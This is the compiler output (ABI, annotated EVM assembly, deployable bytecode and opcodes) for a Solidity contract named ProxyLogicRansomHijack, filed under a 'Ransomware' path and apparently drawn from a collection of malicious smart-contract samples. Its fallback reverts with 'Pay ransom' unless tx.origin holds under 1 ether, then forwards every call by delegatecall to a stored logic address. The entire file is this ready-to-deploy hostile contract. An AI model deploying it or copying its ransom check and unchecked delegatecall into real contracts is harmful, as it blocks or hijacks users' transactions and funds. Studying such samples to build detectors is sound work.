{
	"R/Ransomware/ProxyLogicRansomHijack.sol": {
		"ProxyLogicRansomHijack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_logic",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"stateMutability": "nonpayable",
					"type": "fallback"
				},
				{
					"inputs": [],
					"name": "logic",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":0:526  contract ProxyLogicRansomHijack {... */\n  mstore(0x40, 0x80)\n    /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":65:124  constructor(address _logic) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":111:117  _logic */\n  dup1\n    /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":103:108  logic */\n  0x00\n  dup1\n    /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":103:117  logic = _logic */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":65:124  constructor(address _logic) {... */\n  pop\n    /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":0:526  contract ProxyLogicRansomHijack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":0:526  contract ProxyLogicRansomHijack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":0:526  contract ProxyLogicRansomHijack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xd7dfa0dd\n      eq\n      tag_4\n      jumpi\n      jump(tag_3)\n    tag_2:\n    tag_3:\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":188:195  1 ether */\n      0x0de0b6b3a7640000\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":168:177  tx.origin */\n      origin\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":168:185  tx.origin.balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":168:195  tx.origin.balance < 1 ether */\n      lt\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":160:210  require(tx.origin.balance < 1 ether, \"Pay ransom\") */\n      tag_7\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_8\n      swap1\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_7:\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":262:276  calldatasize() */\n      calldatasize\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":259:260  0 */\n      0x00\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":256:257  0 */\n      dup1\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":243:277  calldatacopy(0, 0, calldatasize()) */\n      calldatacopy\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":365:366  0 */\n      0x00\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":362:363  0 */\n      dup1\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":346:360  calldatasize() */\n      calldatasize\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":343:344  0 */\n      0x00\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":330:340  logic.slot */\n      dup1\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":324:341  sload(logic.slot) */\n      sload\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":317:322  gas() */\n      gas\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":304:367  delegatecall(gas(), sload(logic.slot), 0, calldatasize(), 0, 0) */\n      delegatecall\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":401:417  returndatasize() */\n      returndatasize\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":398:399  0 */\n      0x00\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":395:396  0 */\n      dup1\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":380:418  returndatacopy(0, 0, returndatasize()) */\n      returndatacopy\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":438:444  result */\n      dup1\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":450:451  0 */\n      0x00\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":445:468  case 0 { revert(0, 0) } */\n      dup2\n      eq\n      tag_11\n      jumpi\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":489:505  returndatasize() */\n      returndatasize\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":486:487  0 */\n      0x00\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":479:506  return(0, returndatasize()) */\n      return\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":445:468  case 0 { revert(0, 0) } */\n    tag_11:\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":464:465  0 */\n      0x00\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":461:462  0 */\n      dup1\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":454:466  revert(0, 0) */\n      revert\n        /* \"R/Ransomware/ProxyLogicRansomHijack.sol\":38:58  address public logic */\n    tag_4:\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      mload(0x40)\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n    tag_13:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:176   */\n    tag_16:\n        /* \"#utility.yul\":91:102   */\n      0x00\n        /* \"#utility.yul\":125:131   */\n      dup3\n        /* \"#utility.yul\":120:123   */\n      dup3\n        /* \"#utility.yul\":113:132   */\n      mstore\n        /* \"#utility.yul\":165:169   */\n      0x20\n        /* \"#utility.yul\":160:163   */\n      dup3\n        /* \"#utility.yul\":156:170   */\n      add\n        /* \"#utility.yul\":141:170   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:176   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":182:342   */\n    tag_17:\n        /* \"#utility.yul\":322:334   */\n      0x5061792072616e736f6d00000000000000000000000000000000000000000000\n        /* \"#utility.yul\":318:319   */\n      0x00\n        /* \"#utility.yul\":310:316   */\n      dup3\n        /* \"#utility.yul\":306:320   */\n      add\n        /* \"#utility.yul\":299:335   */\n      mstore\n        /* \"#utility.yul\":182:342   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":348:714   */\n    tag_18:\n        /* \"#utility.yul\":490:493   */\n      0x00\n        /* \"#utility.yul\":511:578   */\n      tag_26\n        /* \"#utility.yul\":575:577   */\n      0x0a\n        /* \"#utility.yul\":570:573   */\n      dup4\n        /* \"#utility.yul\":511:578   */\n      tag_16\n      jump\t// in\n    tag_26:\n        /* \"#utility.yul\":504:578   */\n      swap2\n      pop\n        /* \"#utility.yul\":587:680   */\n      tag_27\n        /* \"#utility.yul\":676:679   */\n      dup3\n        /* \"#utility.yul\":587:680   */\n      tag_17\n      jump\t// in\n    tag_27:\n        /* \"#utility.yul\":705:707   */\n      0x20\n        /* \"#utility.yul\":700:703   */\n      dup3\n        /* \"#utility.yul\":696:708   */\n      add\n        /* \"#utility.yul\":689:708   */\n      swap1\n      pop\n        /* \"#utility.yul\":348:714   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":720:1139   */\n    tag_9:\n        /* \"#utility.yul\":886:890   */\n      0x00\n        /* \"#utility.yul\":924:926   */\n      0x20\n        /* \"#utility.yul\":913:922   */\n      dup3\n        /* \"#utility.yul\":909:927   */\n      add\n        /* \"#utility.yul\":901:927   */\n      swap1\n      pop\n        /* \"#utility.yul\":973:982   */\n      dup2\n        /* \"#utility.yul\":967:971   */\n      dup2\n        /* \"#utility.yul\":963:983   */\n      sub\n        /* \"#utility.yul\":959:960   */\n      0x00\n        /* \"#utility.yul\":948:957   */\n      dup4\n        /* \"#utility.yul\":944:961   */\n      add\n        /* \"#utility.yul\":937:984   */\n      mstore\n        /* \"#utility.yul\":1001:1132   */\n      tag_29\n        /* \"#utility.yul\":1127:1131   */\n      dup2\n        /* \"#utility.yul\":1001:1132   */\n      tag_18\n      jump\t// in\n    tag_29:\n        /* \"#utility.yul\":993:1132   */\n      swap1\n      pop\n        /* \"#utility.yul\":720:1139   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1145:1271   */\n    tag_19:\n        /* \"#utility.yul\":1182:1189   */\n      0x00\n        /* \"#utility.yul\":1222:1264   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1215:1220   */\n      dup3\n        /* \"#utility.yul\":1211:1265   */\n      and\n        /* \"#utility.yul\":1200:1265   */\n      swap1\n      pop\n        /* \"#utility.yul\":1145:1271   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1277:1373   */\n    tag_20:\n        /* \"#utility.yul\":1314:1321   */\n      0x00\n        /* \"#utility.yul\":1343:1367   */\n      tag_32\n        /* \"#utility.yul\":1361:1366   */\n      dup3\n        /* \"#utility.yul\":1343:1367   */\n      tag_19\n      jump\t// in\n    tag_32:\n        /* \"#utility.yul\":1332:1367   */\n      swap1\n      pop\n        /* \"#utility.yul\":1277:1373   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1379:1497   */\n    tag_21:\n        /* \"#utility.yul\":1466:1490   */\n      tag_34\n        /* \"#utility.yul\":1484:1489   */\n      dup2\n        /* \"#utility.yul\":1466:1490   */\n      tag_20\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":1461:1464   */\n      dup3\n        /* \"#utility.yul\":1454:1491   */\n      mstore\n        /* \"#utility.yul\":1379:1497   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1503:1725   */\n    tag_15:\n        /* \"#utility.yul\":1596:1600   */\n      0x00\n        /* \"#utility.yul\":1634:1636   */\n      0x20\n        /* \"#utility.yul\":1623:1632   */\n      dup3\n        /* \"#utility.yul\":1619:1637   */\n      add\n        /* \"#utility.yul\":1611:1637   */\n      swap1\n      pop\n        /* \"#utility.yul\":1647:1718   */\n      tag_36\n        /* \"#utility.yul\":1715:1716   */\n      0x00\n        /* \"#utility.yul\":1704:1713   */\n      dup4\n        /* \"#utility.yul\":1700:1717   */\n      add\n        /* \"#utility.yul\":1691:1697   */\n      dup5\n        /* \"#utility.yul\":1647:1718   */\n      tag_21\n      jump\t// in\n    tag_36:\n        /* \"#utility.yul\":1503:1725   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212204e3e25067503046564695b768d4652325ee6b8bfb9e329e82fda31ff9e0c6ac364736f6c634300081a0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b50604051610302380380610302833981810160405281019061003191906100d4565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f80fd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b6101f68061010c5f395ff3fe608060405234801561000f575f80fd5b506004361061002d575f3560e01c8063d7dfa0dd146100af5761002e565b5b670de0b6b3a76400003273ffffffffffffffffffffffffffffffffffffffff16311061008f576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100869061014a565b60405180910390fd5b365f80375f80365f80545af43d5f803e805f81146100ab573d5ff35b5f80fd5b6100b76100cd565b6040516100c491906101a7565b60405180910390f35b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f82825260208201905092915050565b7f5061792072616e736f6d000000000000000000000000000000000000000000005f82015250565b5f610134600a836100f0565b915061013f82610100565b602082019050919050565b5f6020820190508181035f83015261016181610128565b9050919050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61019182610168565b9050919050565b6101a181610187565b82525050565b5f6020820190506101ba5f830184610198565b9291505056fea26469706673582212204e3e25067503046564695b768d4652325ee6b8bfb9e329e82fda31ff9e0c6ac364736f6c634300081a0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x302 CODESIZE SUB DUP1 PUSH2 0x302 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xD4 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB3 DUP2 PUSH2 0x99 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xCE DUP2 PUSH2 0xAA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE9 JUMPI PUSH2 0xE8 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF6 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x1F6 DUP1 PUSH2 0x10C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xD7DFA0DD EQ PUSH2 0xAF JUMPI PUSH2 0x2E JUMP JUMPDEST JUMPDEST PUSH8 0xDE0B6B3A7640000 ORIGIN PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x8F JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x86 SWAP1 PUSH2 0x14A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST CALLDATASIZE PUSH0 DUP1 CALLDATACOPY PUSH0 DUP1 CALLDATASIZE PUSH0 DUP1 SLOAD GAS DELEGATECALL RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY DUP1 PUSH0 DUP2 EQ PUSH2 0xAB JUMPI RETURNDATASIZE PUSH0 RETURN JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0xB7 PUSH2 0xCD JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xC4 SWAP2 SWAP1 PUSH2 0x1A7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x5061792072616E736F6D00000000000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x134 PUSH1 0xA DUP4 PUSH2 0xF0 JUMP JUMPDEST SWAP2 POP PUSH2 0x13F DUP3 PUSH2 0x100 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x161 DUP2 PUSH2 0x128 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x191 DUP3 PUSH2 0x168 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1A1 DUP2 PUSH2 0x187 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1BA PUSH0 DUP4 ADD DUP5 PUSH2 0x198 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x4E RETURNDATACOPY 0x25 MOD PUSH22 0x3046564695B768D4652325EE6B8BFB9E329E82FDA31 SELFDESTRUCT SWAP15 0xC PUSH11 0xC364736F6C634300081A00 CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "100400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"": "infinite",
						"logic()": "2483"
					}
				},
				"methodIdentifiers": {
					"logic()": "d7dfa0dd"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 2,
						"contract": "R/Ransomware/ProxyLogicRansomHijack.sol:ProxyLogicRansomHijack",
						"label": "logic",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}